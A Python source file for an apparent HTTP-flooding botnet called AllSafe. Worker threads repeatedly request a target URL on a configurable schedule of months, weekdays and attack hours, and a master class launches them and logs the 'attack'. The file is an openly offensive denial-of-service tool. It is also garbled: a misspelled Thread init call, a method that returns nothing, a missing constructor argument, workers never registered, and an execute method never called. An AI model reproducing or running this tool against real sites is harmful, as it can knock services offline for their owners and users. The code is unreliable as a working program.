"""
This is the script handling the worker of the botnet seen as a single thread. 
The botnet will be made of multiple agents, independent each other, each one
using thread-based parallelism according to the features of their own running machines 
to handle multiple connection to the specified url.

Created:    24 October 2016
Modified:   30 December 2016
"""

from threading import Thread
from datetime import datetime, date
from time import time, sleep as threadSleep

from Request import Request

from utils.config import validateConfigFile
from utils.log import logInfo, logAttack



class AllSafeWorker(Thread):
    def __init__(self, wid, name, config, loglist):
        """
        This class extends the implementation of threading.Thread to handle a HTTP GET request.
        On init we set the thread identifier and we call the super class method.

        @param: wid, integer - the worker unique identifier 
        @param: name, alphanumeric string - the thread unique name
        @param: config, dictionary - the configuration parameter for this thread
        @param: loglist, list - the logging dictionary from master to store calls and results
        """
        # calling superclass init method
        Thread._init__(self)
        # setting up threading attribute
        self._wid     = wid
        self._name    = name
        # setting up connection parameters from dictionary
        # configuration - connection
        self._request = config['request_params']
        # configuration - periodicity and sessions
        try:
            self._period   = int(config['period'])
            self._maxcount = int(config['maxcount'])
            self._sessions = config['sessions']
        except ValueError:
            raise Exception("WORKER"+str(wid)+"- Invalid configuration for worker - period / maxcount / sessions not properly formatted")
        # configuration - action 
        self._action   = config['action_conditions']

        # logging
        self._loglist  = loglist


    def getWorkerTarget(self):
        """
        This method prints out a human readable representation of this worker purpose
        """
        workerTarget  = self.getName()
        workerTarget += " - TARGET: "  + self._request['url']
        workerTarget += " - AGENT: "   + self._request['user-agent']

    
    def carryAttack(self):
        """ 
        This method can be used to verify if the attack can be carried according the action conditions
        presetted in the config file

        @return: boolean, if the attack can be carried or not
        """
        # retrieving current date and time - it uses UTC based comparison
        today  = date.today()
        utcnow = datetime.utcnow()

        # checking for day 
        if today.month in self._action['avoid_month']:
            return False
        if (today.weekday()+1) in self._action['avoid_week']:
            return False

        # check if there is any particolar attack time
        if self._action != None:
            attackTime = map((lambda t: int(t)), self._action['attack_time'].split("-"))
            if min(attackTime) <= utcnow.hour <= max(attackTime):
                return True
            else:
                return False
        # or check for AM / PM 
        else:
            if self._action['AM'] and self._action['PM']:
                return True
            if self._action['AM']:
                return 0 < utcnow.hour <= 12
            if self._action['PM']:
                return 12 < utcnow.hour <= 24


    def run(self):
        """ 
        This method is the one executed by the worker thread when it is started by the master thread.
        It check if it is possible to carry the attack, then start performing requests, carrying it on
        according to the configuration file.
        """
        # check if the attack can be carried on
        greenlight = self.carryAttack()

        while self._sessions > 0:
            if greenlight:
                # performing the attack
                for i in range(0, self._maxcount):
                    # instantiate request class 
                    req = Request(self._request)
                    # running request object
                    error = False 
                    try:
                        # req is a thread 
                        req.start()
                    except ValueError:
                        # an error occured during request performing!
                        error = True
                        continue
                    
                    # storing the value for logging feature in a tuple (timestamp, data)
                    attackData = self.getWorkerTarget() 
                    if error:
                        attackData += " => ERROR"
                    self._loglist.append((time(), attackData))

                    # thread safe sleeping for the specified interval
                    threadSleep(self._period)

                # decreasing session counter
                self._sessions  -= 1
                if self._sessions == 0: 
                    break
            
            greenlight = self.carryAttack()


class AllSafeWorkerMaster():
    def __init__(self, config_file, override=False):
        """
        This class represents the botnet master as the thread who is in command to launch every 
        thread execution in order to fulfill botnet requiremets. It accepts a configuration file
        as main 

        @param: config_file, filename - path for the configuration file
        @param: override, boolean - optional param to set the botnet in override mode (params set by GUI)
        """
        # parsing the configuration file to return a configuration dictionary
        self._configuration = validateConfigFile(config_file, override)
        if self._configuration == None:
            raise Exception("Configuration file is not properly formatted, or missing schema in /utils directory!")

        # configuring the master
        self._log      = self._configuration["log_file"]
        self._targets  = self._configuration["targets"]

        # initializing workers array
        self._workers = []
        # initializing workers log dictionary
        self._workers_log = dict()

    
    def initializeWorkers(self):
        """
        This method allow the botnet master to create every thread with correct parameters in order
        to correctly execute them.
        """
        
        # logging the initialization routine - start
        logInfo(self._log, "------------------- <SETUP> -------------------")

        for i in range(0, len(self._targets)):
            # iterating over the target list we initialize every worker
            # and their log section 
            self._workers_log[i] = []
            worker = AllSafeWorker(i, "worker-" + str(i), self._targets[i])
            # logging worker reference
            logInfo(self._log, worker.getWorkerTarget())

        # logging the initialization routine - end
        logInfo(self._log, "------------------- </SETUP> -------------------")


    def executeBotnet(self): 
        """
        This method handle the execution of the entire botnet, starting each worker one after one and
        handling the final join operation.
        """

        logInfo(self._log, "------------------- <STARTUP> -------------------")

        # iterating over workers to start them up
        for worker in self._workers:
            # logging the startup routine
            logInfo(self._log, "starting up " + worker.getName() + " ...")
            worker.start()

        logInfo(self._log, "------------------- </STARTUP> -------------------")

        # iterating over worker to join them
        for worker_to_join in self._workers:
            worker_to_join.join()
        
        # logging the attack
        logAttack(self._workers_log)

if __name__ == "__main__":
    master = AllSafeWorkerMaster('./utils/config_schema_example.json')
    master.initializeWorkers()
    master.executeBotnet
    